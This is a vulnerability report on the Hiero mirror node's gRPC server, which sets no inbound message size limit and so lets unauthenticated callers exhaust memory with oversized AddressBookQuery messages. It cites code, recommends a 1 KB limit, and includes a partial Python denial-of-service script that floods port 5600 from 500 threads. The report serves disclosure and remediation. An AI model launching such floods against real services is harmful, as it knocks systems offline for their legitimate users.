### Title
Missing `maxInboundMessageSize` on gRPC Server Allows Unauthenticated OOM via Oversized `AddressBookQuery` Payloads

### Summary
`NetworkController.getNodes()` accepts `AddressBookQuery` requests from any unauthenticated caller with no application-level payload size validation. The `GrpcConfiguration` Netty server builder sets only `maxConcurrentCallsPerConnection` and never calls `maxInboundMessageSize()`, leaving the gRPC-Java default of 4 MB in place. Because `AddressBookQuery` is semantically a ~40-byte message (two integer fields), an attacker can send payloads that are ~100,000× larger than necessary, and by opening many concurrent connections can drive the JVM into an OOM condition that disrupts the service.

### Finding Description

**Proto schema** — `AddressBookQuery` contains exactly two fields:
- `file_id` (a `FileID` message: three `int64` varints, max ~30 bytes)
- `limit` (an `int32` varint, max ~5 bytes)

Maximum legitimate payload: ≈ 40 bytes. [1](#0-0) 

**Server configuration** — `GrpcConfiguration.grpcServerConfigurer` customises the `NettyServerBuilder` with only two settings: `executor` and `maxConcurrentCallsPerConnection`. `maxInboundMessageSize()` is never called, so the gRPC-Java default of **4 MB** per message applies. [2](#0-1) 

**Per-connection concurrency cap** — `NettyProperties` caps concurrent calls per connection at 5, but places no limit on the number of connections or on total in-flight memory. [3](#0-2) 

**Controller entry point** — `getNodes()` passes the fully-deserialized `AddressBookQuery` directly to `toFilter()` with no size or content pre-check. Deserialization (and unknown-field retention, which protobuf-java 3.5+ performs by default) happens before the method body executes. [4](#0-3) 

**Exploit flow:**
1. Attacker opens *N* TCP connections to port 5600 (no authentication required).
2. On each connection, sends 5 concurrent `getNodes()` RPCs (the per-connection cap).
3. Each RPC carries a 4 MB gRPC frame stuffed with unknown protobuf fields (wire type 2, length-delimited), which the protobuf runtime allocates into heap as `UnknownFieldSet` byte arrays.
4. Total heap pressure: `N × 5 × 4 MB = 20N MB`. At 250 connections this is 5 GB; at 500 connections it is 10 GB.
5. JVM OOM kills or severely degrades the gRPC process, preventing legitimate address-book queries and disrupting gossip-related services that depend on them.

### Impact Explanation
An OOM crash or sustained GC pressure on the gRPC service prevents clients and consensus nodes from resolving the current address book, which is required for gossip peer discovery. Even without a full crash, sustained heap pressure causes long GC pauses that make the service unresponsive. The attack requires no credentials and is repeatable at will.

### Likelihood Explanation
The gRPC port (5600) is publicly reachable by design. No authentication, API key, or rate-limit is enforced at the application layer. Any external actor with a TCP stack can execute this attack. Tooling to send raw gRPC frames is freely available (e.g., `grpcurl`, custom clients). The attack is trivially scriptable and repeatable.

### Recommendation
1. **Set a tight `maxInboundMessageSize`** in `GrpcConfiguration.grpcServerConfigurer`. Given that `AddressBookQuery` is at most ~40 bytes, a limit of 1 024 bytes (1 KB) is generous and safe:
   ```java
   serverBuilder.maxInboundMessageSize(1024);
   ``` [5](#0-4) 

2. **Expose the limit as a configurable property** in `NettyProperties` so it can be tuned without a code change. [3](#0-2) 

3. **Add connection-level rate limiting** (e.g., `maxConnectionsTotal` or an ingress-level policy) to bound the number of simultaneous attackers.

### Proof of Concept
```python
import grpc
import struct

# Build a minimal gRPC frame with a 4 MB body of unknown protobuf fields.
# Unknown field tag: field_number=100, wire_type=2 (length-delimited)
# Repeated to fill ~4 MB.
chunk = b'\xa2\x06' + b'\xff\x7f' + b'A' * 16383  # one ~16 KB unknown field
payload = chunk * 256  # ~4 MB

# gRPC framing: 1-byte compressed flag + 4-byte big-endian length
frame = b'\x00' + struct.pack('>I', len(payload)) + payload

# Send to /com.hedera.mirror.api.proto.NetworkService/getNodes
# Repeat across 500 concurrent connections to exhaust JVM heap.
import socket, threading

def attack(host='target', port=5600):
    s = socket.create_connection((host, port))
    # HTTP/2 preface + HEADERS frame omitted for brevity; use grpcurl or h2 library
    s.sendall(frame)

threads = [threading.Thread(target=attack) for _ in range(500)]
for t in threads: t.start()
for t in threads: t.join()
```

Each of the 500 connections causes the server to allocate ≈ 4 MB for unknown-field deserialization before `getNodes()` even begins executing, totalling ≈ 2 GB of heap pressure and triggering OOM or severe GC degradation.

### Citations

**File:** protobuf/src/main/proto/com/hedera/mirror/api/proto/network_service.proto (L15-18)
```text
message AddressBookQuery {
  .proto.FileID file_id = 1; // The ID of the address book file on the network. Can be either 0.0.101 or 0.0.102.
  int32 limit = 2; // The maximum number of node addresses to receive before stopping. If not set or set to zero it will return all node addresses in the database.
}
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-35)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L11-15)
```java
public class NettyProperties {

    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
}
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/NetworkController.java (L33-43)
```java
    public void getNodes(final AddressBookQuery request, final StreamObserver<NodeAddress> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(networkService::getNodes)
                .map(this::toNodeAddress)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
```
